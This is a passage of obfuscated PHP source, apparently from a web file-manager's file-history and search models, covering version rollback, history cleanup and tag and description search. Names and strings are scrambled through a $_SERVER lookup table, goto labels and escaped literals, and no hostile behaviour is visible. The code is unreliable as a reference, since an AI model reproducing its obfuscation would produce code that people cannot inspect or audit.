get_path_this($ÕÚ£¡‘¤); $ĞÆ§ƒğ = $ĞÆ§ƒğ ? $ĞÆ§ƒğ : $ç™÷«Ñ“[$ƒá¨ßƒ¶[1315]]; $ŸôÜ…Šş = substr(get_path_this($ç™÷«Ñ“[$ƒá¨ßƒ¶[1316]]), 0, -strlen($Ãî˜üƒ)); foreach ($ç™÷«Ñ“[$ƒá¨ßƒ¶[445]] as $Ëˆé‘³Ç => $ºŸëÕ›) { $«íæùÑ = $ÁÙîÕµÚ . substr($ºŸëÕ›[$ƒá¨ßƒ¶[32]], strlen($ŸôÜ…Šş)); $£»è¡Ãø = IO::move($ç™÷«Ñ“[$ƒá¨ßƒ¶[1315]] . $ºŸëÕ›[$ƒá¨ßƒ¶[32]], $ĞÆ§ƒğ, !1, $«íæùÑ); if ($£»è¡Ãø) { $ç™÷«Ñ“[$ƒá¨ßƒ¶[445]][$Ëˆé‘³Ç][$ƒá¨ßƒ¶[32]] = $«íæùÑ; } } $ç™÷«Ñ“[$ƒá¨ßƒ¶[1316]] = IO::move($ç™÷«Ñ“[$ƒá¨ßƒ¶[1316]], $ĞÆ§ƒğ, !1, $ÁÙîÕµÚ . $Ãî˜üƒ); self::saveData($ç™÷«Ñ“[$ƒá¨ßƒ¶[1316]], $ç™÷«Ñ“[$ƒá¨ßƒ¶[445]]); self::clearEmptyFolder($ç™÷«Ñ“[$ƒá¨ßƒ¶[1315]]); } public static function rollback($¼éşÌƒ, $ñîÜÄ¹Ã) { $Ôé¨ıÆ“ =& $_SERVER[óÔë„ú]; $ ²ÁøºŸ = self::listData($¼éşÌƒ); if (!$ ²ÁøºŸ) { return; } $¯Ä¡ªÍ = IO::info($¼éşÌƒ); foreach ($ ²ÁøºŸ[$Ôé¨ıÆ“[445]] as $ãïËı“û => $Ò˜¤öÆ¸) { if ($Ò˜¤öÆ¸[$Ôé¨ıÆ“[475]] == $ñîÜÄ¹Ã) { self::add($¼éşÌƒ); $¤˜¦©åÕ = $ ²ÁøºŸ[$Ôé¨ıÆ“[1315]] . $Ò˜¤öÆ¸[$Ôé¨ıÆ“[32]]; $¶šÀ‹ÁÉ = IO::copy($¤˜¦©åÕ, IO::pathFather($¼éşÌƒ), REPEAT_REPLACE, $¯Ä¡ªÍ[$Ôé¨ıÆ“[32]]); if ($¶šÀ‹ÁÉ) { self::remove($¼éşÌƒ, $ñîÜÄ¹Ã); } return $¶šÀ‹ÁÉ; } } return !1; } public static function setDetail($—ˆĞÛÈ, $³İĞ×ãã, $ò’ğ‘Ğ) { $ÃµÈı ‚ =& $_SERVER[óÔë„ú]; $´˜‡Š¡› = self::listData($—ˆĞÛÈ); if (!$´˜‡Š¡›) { return; } foreach ($´˜‡Š¡›[$ÃµÈı ‚[445]] as $Ü©ŸéºŒ => $Ê˜ÌÒ²) { if ($Ê˜ÌÒ²[$ÃµÈı ‚[475]] == $³İĞ×ãã) { $´˜‡Š¡›[$ÃµÈı ‚[445]][$Ü©ŸéºŒ][$ÃµÈı ‚[1314]] = $ò’ğ‘Ğ; self::saveData($´˜‡Š¡›[$ÃµÈı ‚[1316]], $´˜‡Š¡›[$ÃµÈı ‚[445]]); return !0; } } return !1; } public static function fileInfo($‘ãÑíÏŸ, $¥‹Ğ˜ßÂ) { $öêÕ¶¡á =& $_SERVER[óÔë„ú]; $Ò¨áñ¶ú = self::listData($‘ãÑíÏŸ); if (!$Ò¨áñ¶ú) { show_json(LNG($öêÕ¶¡á[108]), !1); } $ÏÙµÓé  = $öêÕ¶¡á[12]; foreach ($Ò¨áñ¶ú[$öêÕ¶¡á[445]] as $–ë°’ => $İÇ¿”šˆ) { if ($İÇ¿”šˆ[$öêÕ¶¡á[475]] != $¥‹Ğ˜ßÂ) { continue; } $ÏÙµÓé  = $Ò¨áñ¶ú[$öêÕ¶¡á[1315]] . $İÇ¿”šˆ[$öêÕ¶¡á[32]]; break; } if (!$ÏÙµÓé ) { show_json(LNG($öêÕ¶¡á[108]), !1); } return IO::info($ÏÙµÓé ); } public static function fileOut($éÚ‰«ëÀ, $¡Ø×ËÈ, $‘à­„³í = false) { $ş«’Ó¥ =& $_SERVER[óÔë„ú]; $ŠØšÉ¢‚ = self::fileInfo($éÚ‰«ëÀ, $¡Ø×ËÈ); $Üß¬¤ıè =& $GLOBALS[$ş«’Ó¥[7]]; $‘à­„³í = isset($Üß¬¤ıè[$ş«’Ó¥[1266]]) && $Üß¬¤ıè[$ş«’Ó¥[1266]] == 1; if (isset($Üß¬¤ıè[$ş«’Ó¥[33]]) && $Üß¬¤ıè[$ş«’Ó¥[33]] == $ş«’Ó¥[1317]) { return IO::fileOutImage($ŠØšÉ¢‚[$ş«’Ó¥[87]], $Üß¬¤ıè[$ş«’Ó¥[1318]]); } IO::fileOut($ŠØšÉ¢‚[$ş«’Ó¥[87]], $‘à­„³í, get_path_this($éÚ‰«ëÀ)); } public static function listData($ŠòÄ ª, $ÀùÈëãÚ = true) { $ÇòÑ“Ğ =& $_SERVER[óÔë„ú]; if ($ÀùÈëãÚ && !IO::exist($ŠòÄ ª)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ŠòÄ ª, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ŞŒã…µ = self::pathHistory($ŠòÄ ª); $ôûØâõ = array($ÇòÑ“Ğ[1316] => $ŞŒã…µ . $ÇòÑ“Ğ[1303], $ÇòÑ“Ğ[1315] => rtrim(get_path_father($ŞŒã…µ), $ÇòÑ“Ğ[8]) . $ÇòÑ“Ğ[8], $ÇòÑ“Ğ[445] => array()); $£†Í­ä = IO::getContent($ôûØâõ[$ÇòÑ“Ğ[1316]]); if ($£†Í­ä) { $´Äèœõá = json_decode($£†Í­ä, !0); if (is_array($´Äèœõá)) { $ôûØâõ[$ÇòÑ“Ğ[445]] = $´Äèœõá; } } return $ôûØâõ; } private static function saveData($•ÖÜ®¹õ, $éÃğÀŒ) { $¸¬Õèâ¿ =& $_SERVER[óÔë„ú]; self::log($¸¬Õèâ¿[1319] . $•ÖÜ®¹õ . $¸¬Õèâ¿[74] . count($éÃğÀŒ), $¸¬Õèâ¿[812]); if ($éÃğÀŒ) { return IO::setContent($•ÖÜ®¹õ, json_encode($éÃğÀŒ)); } $éæÂèª = IO::pathFather($•ÖÜ®¹õ); IO::remove($•ÖÜ®¹õ); self::clearEmptyFolder($éæÂèª); return !0; } public static function clearEmptyFolder($äÂãÛ†) { $»ùÕœ‰– =& $_SERVER[óÔë„ú]; if (trim($äÂãÛ†, $»ùÕœ‰–[8]) == trim(self::$_historyBase, $»ùÕœ‰–[8])) { return; } $ëßìÇ… = IO::pathFather($äÂãÛ†); $ĞÇ˜Ó£¨ = IO::has($äÂãÛ†, !0); if ($ĞÇ˜Ó£¨[$»ùÕœ‰–[239]] > 0 || $ĞÇ˜Ó£¨[$»ùÕœ‰–[240]] > 0) { return; } IO::remove($äÂãÛ†); self::clearEmptyFolder($ëßìÇ…); } private static function getBasePath() { $ÖÓšùäƒ =& $_SERVER[óÔë„ú]; $êÉØõãË = Model($ÖÓšùäƒ[1320])->get($ÖÓšùäƒ[1321]); if ($êÉØõãË) { if (!IO::exist($êÉØõãË)) { IO::mkdir($êÉØõãË); } if (get_path_this($êÉØõãË) == $ÖÓšùäƒ[1306]) { $‰ ±Œİ = $ÖÓšùäƒ[1322] . rand_string(8); @rename($êÉØõãË, get_path_father($êÉØõãË) . $ÖÓšùäƒ[8] . $‰ ±Œİ); $êÉØõãË = DATA_PATH . $‰ ±Œİ . $ÖÓšùäƒ[8]; file_put_contents(DATA_PATH . $ÖÓšùäƒ[1253], $ÖÓšùäƒ[12]); Model($ÖÓšùäƒ[1320])->set($ÖÓšùäƒ[1321], $êÉØõãË); } return $êÉØõãË; } $êÉØõãË = DATA_PATH . $ÖÓšùäƒ[1322] . rand_string(8) . $ÖÓšùäƒ[8]; $êÉØõãË = IO::mkdir($êÉØõãË); $êÉØõãË = rtrim($êÉØõãË, $ÖÓšùäƒ[8]) . $ÖÓšùäƒ[8]; file_put_contents($êÉØõãË . $ÖÓšùäƒ[1253], $ÖÓšùäƒ[12]); file_put_contents(DATA_PATH . $ÖÓšùäƒ[1253], $ÖÓšùäƒ[12]); Model($ÖÓšùäƒ[1320])->set($ÖÓšùäƒ[1321], $êÉØõãË); return $êÉØõãË; } } goto FˆÇòÇ½Ó; eÎß£ÆŠ—: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\162\x63\145\x5f\150\151\x73\x74\x6f\x72\171"; public function historyCount($Ÿ¬õÆÈã) { $²ŠîÊü =& $_SERVER[óÔë„ú]; if (!$Ÿ¬õÆÈã) { return array(); } if (is_string($Ÿ¬õÆÈã) || is_int($Ÿ¬õÆÈã)) { $Ÿ¬õÆÈã = array($Ÿ¬õÆÈã); } $ºƒÂŠá‰ = array($²ŠîÊü[193], $²ŠîÊü[1990] => $²ŠîÊü[565]); $‰ÑÌË—  = array($²ŠîÊü[193] => array($²ŠîÊü[7], $Ÿ¬õÆÈã)); $¿á–íº = $this->field($ºƒÂŠá‰)->where($‰ÑÌË— )->group($²ŠîÊü[193])->select(); return array_to_keyvalue($¿á–íº, $²ŠîÊü[193], $²ŠîÊü[565]); } public function addHistory($›åîÒİÑ, $›°ô‚—ì = '') { $ö¦´ôÂÀ =& $_SERVER[óÔë„ú]; $ÈÎÚÈ¯é = array($ö¦´ôÂÀ[491] => $›åîÒİÑ[$ö¦´ôÂÀ[193]], $ö¦´ôÂÀ[1749] => isset($›åîÒİÑ[$ö¦´ôÂÀ[529]]) ? $›åîÒİÑ[$ö¦´ôÂÀ[529]] : $›åîÒİÑ[$ö¦´ôÂÀ[527]], $ö¦´ôÂÀ[542] => $›åîÒİÑ[$ö¦´ôÂÀ[541]], $ö¦´ôÂÀ[617] => $›åîÒİÑ[$ö¦´ôÂÀ[79]], $ö¦´ôÂÀ[2207] => $›°ô‚—ì); if ($GLOBALS[$ö¦´ôÂÀ[6]][$ö¦´ôÂÀ[92]][$ö¦´ôÂÀ[1289]] >= 1) { $this->historyAutoClear($ÈÎÚÈ¯é[$ö¦´ôÂÀ[193]]); $this->add($ÈÎÚÈ¯é); } Hook::trigger($ö¦´ôÂÀ[2208], $ÈÎÚÈ¯é); Model($ö¦´ôÂÀ[2209])->eventFileEdit($›åîÒİÑ[$ö¦´ôÂÀ[193]]); } private function historyAutoClear($‹€©ˆ) { $ó‰Œæİ› =& $_SERVER[óÔë„ú]; $ø½æĞ¨¦ = Model($ó‰Œæİ›[830])->get($ó‰Œæİ›[1311]); $êáïãëï = intval($GLOBALS[$ó‰Œæİ›[6]][$ó‰Œæİ›[92]][$ó‰Œæİ›[1289]]); $½–ÄØüæ = $ø½æĞ¨¦ == $ó‰Œæİ›[1312] ? min(5, $êáïãëï) : $êáïãëï; $½–ÄØüæ = $½–ÄØüæ <= 0 ? 0 : $½–ÄØüæ - 1; if ($½–ÄØüæ >= 499) { return; } $á†Ê€˜ò = array($ó‰Œæİ›[491] => $‹€©ˆ); $ÏèÈé‰± = $this->field($ó‰Œæİ›[2210])->where($á†Ê€˜ò)->order($ó‰Œæİ›[2204])->select(); if (!$ÏèÈé‰± || $½–ÄØüæ >= count($ÏèÈé‰±)) { return; } $ïÜş¢±¼ = array_to_keyvalue($ÏèÈé‰±, $ó‰Œæİ›[12], $ó‰Œæİ›[475]); $ïÜş¢±¼ = array_slice($ïÜş¢±¼, $½–ÄØüæ); $Ñµ•”Ö² = array_to_keyvalue($ÏèÈé‰±, $ó‰Œæİ›[12], $ó‰Œæİ›[541]); $Ñµ•”Ö² = array_slice($Ñµ•”Ö², $½–ÄØüæ); if (!$ïÜş¢±¼ || !$Ñµ•”Ö²) { return; } $á†Ê€˜ò = array($ó‰Œæİ›[493] => array($ó‰Œæİ›[7], $ïÜş¢±¼)); $this->where($á†Ê€˜ò)->delete(); Model($ó‰Œæİ›[544])->remove($Ñµ•”Ö²); } public function listData($°ß£ãÅŠ) { $™òŸÎî =& $_SERVER[óÔë„ú]; $â¬Ø›´š = array($™òŸÎî[491] => $°ß£ãÅŠ); $ç‡Œ™¦ = $™òŸÎî[2211]; $•ú¯äçé = $this->field($ç‡Œ™¦)->where($â¬Ø›´š)->order($™òŸÎî[2204])->selectPage(); $this->_listAppendUser($•ú¯äçé[$™òŸÎî[445]]); $Í†ÁÔ¶ = Model($™òŸÎî[830])->get($™òŸÎî[1311]); $¼ÃÎÕ† = 5; if ($Í†ÁÔ¶ == $™òŸÎî[1312]) { $•ú¯äçé[$™òŸÎî[445]] = array_slice($•ú¯äçé[$™òŸÎî[445]], 0, $¼ÃÎÕ†); $•ú¯äçé[$™òŸÎî[442]] = array($™òŸÎî[2212] => 1, $™òŸÎî[2213] => 20, $™òŸÎî[2214] => 1, $™òŸÎî[2215] => count($•ú¯äçé[$™òŸÎî[445]])); } return $•ú¯äçé; } protected function _listAppendUser(&$æÂŠÎî) { $ÂŠâïşª =& $_SERVER[óÔë„ú]; $Ë“„ûú = array_to_keyvalue($æÂŠÎî, $ÂŠâïşª[12], $ÂŠâïşª[1758]); $ôËâôÛÇ = Model($ÂŠâïşª[598])->userListInfo($Ë“„ûú); foreach ($æÂŠÎî as &$µÆ”¹ıü) { $º¤‚Ù­ = $µÆ”¹ıü[$ÂŠâïşª[1758]]; $µÆ”¹ıü[$ÂŠâïşª[527]] = $ôËâôÛÇ[$º¤‚Ù­] ? $ôËâôÛÇ[$º¤‚Ù­] : !1; } unset($µÆ”¹ıü); } public function fileInfo($…Ş‰«) { $–íÏ¨¸¬ =& $_SERVER[óÔë„ú]; $”–Ìå„Æ = $this->tablePrefix; $Çêåª¨ = "{$”–Ìå„Æ}\x69\x6f\137\x66\x69\154\x65\40\x66\x69\154\145\163\x20\x6f\x6e\x20\x66\x69\x6c\x65\x73\x2e\x66\151\154\x65\111\x44\x20\x3d\x20\x68\x69\x73\x74\157\x72\x79\56\146\151\154\145\x49\x44"; return $this->alias($–íÏ¨¸¬[2216])->where(array($–íÏ¨¸¬[493] => $…Ş‰«))->join($Çêåª¨, $–íÏ¨¸¬[2217])->find(); } public function removeItem($ÇîÃœ†î) { $ÄÇóÁı =& $_SERVER[óÔë„ú]; $ŒÒ¦€š· = array($ÄÇóÁı[493] => $ÇîÃœ†î); $æü•Ï›è = $this->where($ŒÒ¦€š·)->find(); if ($æü•Ï›è) { $ÓìÄ¥ï× = $this->where($ŒÒ¦€š·)->delete(); Model($ÄÇóÁı[544])->remove($æü•Ï›è[$ÄÇóÁı[541]]); return $ÓìÄ¥ï×; } return !1; } public function removeBySource($ç‹ÁÕŸÓ) { $ÙÙğ“¨ =& $_SERVER[óÔë„ú]; if (!$ç‹ÁÕŸÓ) { return !1; } if (!is_array($ç‹ÁÕŸÓ)) { $ç‹ÁÕŸÓ = array($ç‹ÁÕŸÓ); } $’­É÷şı = array($ÙÙğ“¨[491] => array($ÙÙğ“¨[7], $ç‹ÁÕŸÓ)); $÷÷êçò¨ = $this->field($ÙÙğ“¨[542])->where($’­É÷şı)->select(); if ($÷÷êçò¨) { $this->where($’­É÷şı)->delete(); $¼¾½ÔûÍ = array_to_keyvalue($÷÷êçò¨, $ÙÙğ“¨[12], $ÙÙğ“¨[541]); Model($ÙÙğ“¨[544])->remove($¼¾½ÔûÍ); } return !0; } public function setDetail($¡Ö›£ßÏ, $¸æ—ŒÜ©) { $™âÛ“Úï =& $_SERVER[óÔë„ú]; return $this->where(array($™âÛ“Úï[493] => $¡Ö›£ßÏ))->save(array($™âÛ“Úï[2207] => $¸æ—ŒÜ©)); } public function rollbackToItem($„Áú, $®Ì®«ü½) { $¼ğš­½ =& $_SERVER[óÔë„ú]; $¿æÉó— = Model($¼ğš­½[884])->sourceInfo($„Áú); $this->addHistory($¿æÉó—, LNG($¼ğš­½[2218])); $Šş“«ìŞ = $this->find($®Ì®«ü½); $¶ØÚ¢´à = array($¼ğš­½[541] => $Šş“«ìŞ[$¼ğš­½[541]], $¼ğš­½[79] => $Šş“«ìŞ[$¼ğš­½[79]], $¼ğš­½[88] => time(), $¼ğš­½[529] => USER_ID); Model($¼ğš­½[884])->where(array($¼ğš­½[193] => $„Áú))->save($¶ØÚ¢´à); return $this->where(array($¼ğš­½[493] => $®Ì®«ü½))->delete(); } public function clearSame($îÍĞ‚¬) { $©ÕµÑâ =& $_SERVER[óÔë„ú]; $³ Ú¸ŠÙ = $this->listData($îÍĞ‚¬); $ı„ï– ² = array_to_keyvalue_group($³ Ú¸ŠÙ, $©ÕµÑâ[541]); $‹·‹Ÿ´« = array(); $Ş¡øÀæÒ = array(); foreach ($ı„ï– ² as $›­—¸Ü§) { if (!$›­—¸Ü§ || count($›­—¸Ü§) <= 1) { continue; } foreach ($›­—¸Ü§ as $ƒ„°€É¢) { $‹·‹Ÿ´«[] = $ƒ„°€É¢[$©ÕµÑâ[541]]; $Ş¡øÀæÒ[] = $ƒ„°€É¢[$©ÕµÑâ[475]]; } } if (!$Ş¡øÀæÒ) { return; } $this->where(array($©ÕµÑâ[475] => array($©ÕµÑâ[7], $Ş¡øÀæÒ)))->delete(); Model($©ÕµÑâ[544])->remove($‹·‹Ÿ´«); } public function userSpace() { $Ÿ…ı‘ß¡ =& $_SERVER[óÔë„ú]; $ê†ó˜‹Ó = $this->tablePrefix; $éÑ×öÂ€ = array($Ÿ…ı‘ß¡[1749] => USER_ID); $ÀÃ°­’Ú = "{$ê†ó˜‹Ó}\151\157\137\146\151\154\x65\40\x66\151\x6c\x65\x73\40\x6f\156\40\146\x69\x6c\x65\x73\56\146\x69\154\145\111\104\x20\x3d\x20\150\x69\x73\164\x6f\x72\171\x2e\x66\x69\x6c\145\111\104"; return $this->alias($Ÿ…ı‘ß¡[2216])->where($éÑ×öÂ€)->join($ÀÃ°­’Ú, $Ÿ…ı‘ß¡[2217])->sum($Ÿ…ı‘ß¡[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Øî¦ƒÒŸ) { $ë¨½ÛàØ =& $_SERVER[óÔë„ú]; $”ÁŒ—» = KodIO::fileTypeList(); $µå¿¼Ë = $”ÁŒ—»[$Øî¦ƒÒŸ]; if (!$µå¿¼Ë) { return array(); } $‰ïñ²œá = $µå¿¼Ë[$ë¨½ÛàØ[169]]; $Æõ©ÒÏµ = $ë¨½ÛàØ[7]; if (!$µå¿¼Ë[$ë¨½ÛàØ[169]]) { $Ê§—İÁä = array_to_keyvalue($”ÁŒ—», $ë¨½ÛàØ[12], $ë¨½ÛàØ[169]); $‰ïñ²œá = implode($ë¨½ÛàØ[50], $Ê§—İÁä); $Æõ©ÒÏµ = $ë¨½ÛàØ[2219]; } $Š×íëÀß = explode($ë¨½ÛàØ[50], trim($‰ïñ²œá, $ë¨½ÛàØ[50])); return array($Æõ©ÒÏµ, $Š×íëÀß); } public function listPathType($Ş¾’å©) { $»ÉŠÚÔ¼ =& $_SERVER[óÔë„ú]; $éæÉÛ†Ó = $this->fileTypeWhere($Ş¾’å©); if (!$éæÉÛ†Ó) { return array(); } $œ‹ç¯ïğ = USER_ID; $âñ²¥Ÿ… = Model($»ÉŠÚÔ¼[598])->getInfo($œ‹ç¯ïğ); $™³ğÈ¥Ù = array($»ÉŠÚÔ¼[648] => SourceModel::TYPE_USER, $»ÉŠÚÔ¼[584] => array($»ÉŠÚÔ¼[612], $»ÉŠÚÔ¼[594] . $âñ²¥Ÿ…[$»ÉŠÚÔ¼[90]][$»ÉŠÚÔ¼[193]] . $»ÉŠÚÔ¼[613]), $»ÉŠÚÔ¼[649] => $œ‹ç¯ïğ, $»ÉŠÚÔ¼[646] => 0, $»ÉŠÚÔ¼[647] => $éæÉÛ†Ó); return $this->listSource($™³ğÈ¥Ù); } public function listSearch($î–©¨ç, $¿Ãäüôá = 300) { $–Œåß‡İ =& $_SERVER[óÔë„ú]; if (isset($î–©¨ç[$–Œåß‡İ[2055]]) && $î–©¨ç[$–Œåß‡İ[2055]]) { $î–©¨ç[$–Œåß‡İ[2055]] = str_replace($–Œåß‡İ[460], $–Œåß‡İ[2220], trim($î–©¨ç[$–Œåß‡İ[2055]])); } $íñ°¾È« = $this->_parseSearchWhere($î–©¨ç); if (!isset($íñ°¾È«[$–Œåß‡İ[505]])) { $íñ°¾È«[$–Œåß‡İ[505]] = 0; } $èÁµÑÍ® = $–Œåß‡İ[2221]; $Ÿ›áÏ = $íñ°¾È«; $¯…çş· = $èÁµÑÍ®; $this->_listSearchBindPinyin($î–©¨ç, $íñ°¾È«, $èÁµÑÍ®); $this->alias($–Œåß‡İ[519])->_makeOrder(); $íñ°¾È« = $this->parseWhereLike($íñ°¾È«); $÷À‹ô­ = $this->distinct(!0)->field($èÁµÑÍ®)->where($íñ°¾È«)->selectPage($¿Ãäüôá); if ($GLOBALS[$–Œåß‡İ[6]][$–Œåß‡İ[457]][$–Œåß‡İ[458]] && Input::check($î–©¨ç[$–Œåß‡İ[2055]], $–Œåß‡İ[655]) && $÷À‹ô­[$–Œåß‡İ[442]][$–Œåß‡İ[429]] == 1 && $÷À‹ô­[$–Œåß‡İ[442]][$–Œåß‡İ[443]] == 0) { $÷À‹ô­ = $this->distinct(!0)->field($èÁµÑÍ®)->where($Ÿ›áÏ)->limit(1000)->select(); $÷À‹ô­ = array_page_split($÷À‹ô­, !1, $¿Ãäüôá); } $this->_listSearchFileContent($÷À‹ô­, $î–©¨ç, $¯…çş·, $Ÿ›áÏ); $this->_listSearchDesc($÷À‹ô­, $î–©¨ç, $¯…çş·); $this->_listSearchTag($÷À‹ô­, $î–©¨ç, $¯…çş·); $this->_listSearchGroupTag($÷À‹ô­, $î–©¨ç, $¯…çş·); $this->_listDataApply($÷À‹ô­[$–Œåß‡İ[445]]); $this->_listMake($÷À‹ô­); return $÷À‹ô­; } private function _listSearchFileContent(&$¬Óéœ™½, $êîüÜàà, $„ÄÃ¢Ç“, $å¸ùí¦™) { $„Øê¡ê =& $_SERVER[óÔë„ú]; if (!$êîüÜàà[$„Øê¡ê[2055]] || $¬Óéœ™½[$„Øê¡ê[442]][$„Øê¡ê[429]] > 1) { return; } if (!isset($å¸ùí¦™[$„Øê¡ê[32]]) || !is_array($êîüÜàà[$„Øê¡ê[541]])) { return; } $å¸ùí¦™[$„Øê¡ê[541]] = array($„Øê¡ê[7], $êîüÜàà[$„Øê¡ê[541]]); unset($å¸ùí¦™[$„Øê¡ê[32]]); unset($êîüÜàà[$„Øê¡ê[541]]); $éÏ•ÛôÜ = $this->field($„ÄÃ¢Ç“)->where($å¸ùí¦™)->limit($„Øê¡ê[2222])->select(); if (!$éÏ•ÛôÜ || count($éÏ•ÛôÜ) == 0) { return; } $¬Óéœ™½[$„Øê¡ê[445]] = array_merge($éÏ•ÛôÜ, $¬Óéœ™½[$„Øê¡ê[445]]); $¬Óéœ™½[$„Øê¡ê[442]][$„Øê¡ê[443]] += count($éÏ•ÛôÜ); } private function _listSearchTag(&$ËØ¿º¸Ğ, $ñø„¶ˆÈ, $‘²ö××²) { $”•™¤Õğ =& $_SERVER[óÔë„ú]; if (!$ñø„¶ˆÈ[$”•™¤Õğ[2055]] || $ËØ¿º¸Ğ[$”•™¤Õğ[442]][$”•™¤Õğ[429]] > 1) { return; } $­¯ìÄÇ = Model($”•™¤Õğ[2223])->listData(); $£øÇÀéÓ = array(); $°¨ç‰»ì = $ñø„¶ˆÈ[$”•™¤Õğ[2055]]; foreach ($­¯ìÄÇ as $“¨Ø„Ì) { $öè”ôØ = $“¨Ø„Ì[$”•™¤Õğ[32]]; $¸¯àáÉ° = str_replace($”•™¤Õğ[53], $”•™¤Õğ[12], Pinyin::get($öè”ôØ)); if (stripos($öè”ôØ, $°¨ç‰»ì) !== !1 || stripos($¸¯àáÉ°, $°¨ç‰»ì) !== !1) { $£øÇÀéÓ[] = $“¨Ø„Ì[$”•™¤Õğ[475]]; } } if (!$£øÇÀéÓ) { return; } $“ë»©±ã = array($”•™¤Õğ[500] => array($”•™¤Õğ[7], $£øÇÀéÓ), $”•™¤Õğ[1758] => USER_ID); $Ğ¡’óğÎ = Model($”•™¤Õğ[502])->field($”•™¤Õğ[87])->where($“ë»©±ã)->select(); $Ğ¡’óğÎ = array_to_keyvalue($Ğ¡’óğÎ, $”•™¤Õğ[12], $”•™¤Õğ[87]); $ëŞ–Ú³ = array_unique($Ğ¡’óğÎ); $this->_listSearchMerge($ËØ¿º¸Ğ, $ñø„¶ˆÈ, $‘²ö××², $ëŞ–Ú³); } private function _listSearchDesc(&$ÛÕÏôË÷, $ĞÀ•Ë­, $µ±åÖæ) { $ÉÃãŠÇ‘ =& $_SERVER[óÔë„ú]; if (!$ĞÀ•Ë­[$ÉÃãŠÇ‘[2055]] || $ÛÕÏôË÷[$ÉÃãŠÇ‘[442]][$ÉÃãŠÇ‘[429]] > 1) { return; } $ı¥Ìôå = array($ÉÃãŠÇ‘[97] => $ÉÃãŠÇ‘[526], $ÉÃãŠÇ‘[450] => array($ÉÃãŠÇ‘[459], $ÉÃãŠÇ‘[2057] . $ĞÀ•Ë­[$ÉÃãŠÇ‘[2055]] . $ÉÃãŠÇ‘[2057])); $‰¨–¤´Ö = !1; if ($‰¨–¤´Ö) { $ºÔ‹¹Ö© = $this->listSearchChildren($ĞÀ•Ë­[$ÉÃãŠÇ‘[192]]); $ºÔ‹¹Ö© = array_unique($ºÔ‹¹Ö©); if (!$ºÔ‹¹Ö©) { return; } $ı¥Ìôå[$ÉÃãŠÇ‘[193]] = array($ÉÃãŠÇ‘[7], $ºÔ‹¹Ö©); } $üî¦Ìñš = Model($ÉÃãŠÇ‘[632])->field($ÉÃãŠÇ‘[193])->where($ı¥Ìôå)->limit(5000)->select(); $›‰œçÜŸ = array_to_keyvalue($üî¦Ìñš, $ÉÃãŠÇ‘[12], $ÉÃãŠÇ‘[193]); $this->_listSearchMerge($ÛÕÏôË÷, $ĞÀ•Ë­, $µ±åÖæ, $›‰œçÜŸ); } private function _listSearchGroupTag(&$åƒÏ‡¹ó, $âçÍ×ƒï, $¶òÎÆ­ã) { $‡¿¨ÚÙ¸ =& $_SERVER[óÔë„ú]; if (!$âçÍ×ƒï[$‡¿¨ÚÙ¸[2055]] || $åƒÏ‡¹ó[$‡¿¨ÚÙ¸[442]][$‡¿¨ÚÙ¸[429]] > 1 || !$âçÍ×ƒï[$‡¿¨ÚÙ¸[192]]) { return; } $äİêšèç = $this->sourceInfo($âçÍ×ƒï[$‡¿¨ÚÙ¸[192]]); if (!$äİêšèç || $äİêšèç[$‡¿¨ÚÙ¸[190]] != SourceModel::TYPE_GROUP) { return; } $Ÿ•Æüš® = $äİêšèç[$‡¿¨ÚÙ¸[569]]; $¢İµØÛ = Model($‡¿¨ÚÙ¸[2224])->get($Ÿ•Æüš®); $‘·¢ñáÇ = array(); $­õ’Â¤ö = $âçÍ×ƒï[$‡¿¨ÚÙ¸[2055]]; foreach ($¢İµØÛ[$‡¿¨ÚÙ¸[445]] as $îôŞüõÅ) { $“ùÌåí = $îôŞüõÅ[$‡¿¨ÚÙ¸[32]]; $˜¶Ş«Õø = str_replace($‡¿¨ÚÙ¸[53], $‡¿¨ÚÙ¸[12], Pinyin::get($“ùÌåí)); if (stripos($“ùÌåí, $­õ’Â¤ö) !== !1 || stripos($˜¶Ş«Õø, $­õ’Â¤ö) !== !1) { $‘·¢ñáÇ[] = $îôŞüõÅ[$‡¿¨ÚÙ¸[475]]; } } if (!$‘·¢ñáÇ) { return; } $íÇÈÜ¡Ó = array($‡¿¨ÚÙ¸[500] => array($‡¿¨ÚÙ¸[7], $‘·¢ñáÇ), $‡¿¨ÚÙ¸[1758] => 0, $‡¿¨ÚÙ¸[33] => $‡¿¨ÚÙ¸[2077] . $Ÿ•Æüš®); $ÙË‰ÚŠ = Model($‡¿¨ÚÙ¸[502])->field($‡¿¨ÚÙ¸[87])->where($íÇÈÜ¡Ó)->select(); $ÙË‰ÚŠ = array_to_keyvalue($ÙË‰ÚŠ, $‡¿¨ÚÙ¸[12], $‡¿¨ÚÙ¸[87]); $ÆÄ“ƒ» = array_unique($ÙË‰ÚŠ); $this->_listSearchMerge($åƒÏ‡¹ó, $âçÍ×ƒï, $¶òÎÆ­ã, $ÆÄ“ƒ»); } private function _listSearchMerge(&$–ôË®ÜÖ, $–îßƒÀ„, $ÔÌÚ¾¨Î, $¿¿ÄäÇ´) { $Èš„€–À =& $_SERVER[óÔë„ú]; if (!$¿¿ÄäÇ´) { return; } $êàáĞ­Æ = array_to_keyvalue($–ôË®ÜÖ[$Èš„€–À[445]], $Èš„€–À[12], $Èš„€–À[193]); $“©äŞ‚ = array_diff($¿¿ÄäÇ´, $êàáĞ­Æ); if (!$“©äŞ‚) { return; } $œŠâêû“ = array($Èš„€–À[193] => array($Èš„€–À[7], $“©äŞ‚)); $Ú™×Éş = $this->field($ÔÌÚ¾¨Î)->where($œŠâêû“)->select(); if (!$Ú™×Éş) { return; } $ó–²Ü·Œ = array(); foreach ($Ú™×Éş as $Ì†á¤™œ) { if ($this->_listSearchFilter($Ì†á¤™œ, $–îßƒÀ„)) { $ó–²Ü·Œ[] = $Ì†á¤™œ; } } $–ôË®ÜÖ[$Èš„€–À[445]] = array_merge($ó–²Ü·Œ, $–ôË®ÜÖ[$Èš„€–À[445]]); $–ôË®ÜÖ[$Èš„€–À[442]][$Èš„€–À[443]] += count($ó–²Ü·Œ); } private function _listSearchFilter($œ©®§ª, $°Õô¸áÓ) { $­µ†şı´ =& $_SERVER[óÔë„ú]; $ÚÖª’ = $œ©®§ª[$­µ†şı´[485]] == $­µ†şı´[91]; if (!strstr($œ©®§ª[$­µ†şı´[584]], $­µ†şı´[50] . $°Õô¸áÓ[$­µ†şı´[192]] . 